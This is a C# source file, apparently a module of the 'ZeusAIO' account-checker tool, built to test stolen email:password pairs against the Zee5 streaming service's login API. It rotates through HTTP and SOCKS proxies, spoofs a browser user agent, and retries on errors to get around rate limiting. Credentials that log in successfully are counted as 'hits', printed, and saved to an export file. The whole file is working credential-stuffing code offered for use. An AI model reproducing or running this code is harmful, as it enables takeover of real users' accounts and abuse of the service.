using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Zee5
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                       new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://userapi.zee5.com/v2/user/loginemail", string.Concat(new string[]
                        {
                                "{\"email\":\"",
                                s[0],
                                "\",\"password\":\"",
                                s[1],
                                "\"}"
                        }), "application/json").ToString();
                        bool flag7 = text2.Contains("{\"access_token\":\"");

                        if (flag7)
                        {
                            ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - ZEE5] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Zee5_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                        {
                            bool flag8 = text2.Contains("\"message\":\"The email address and password combination was wrong during login.\"");
                            if (flag8)
                            {
                                // Bad
                                break;
                            }
                            else if (text2.Contains("message\":\"Invalid input parameter\",\"fields\":[{\"field\":\"Password\",\"message\":\"Invalid password"))
                            {
                                    // Bad
                                    break;
                                }
                            else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                        }

                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
        
    }
}
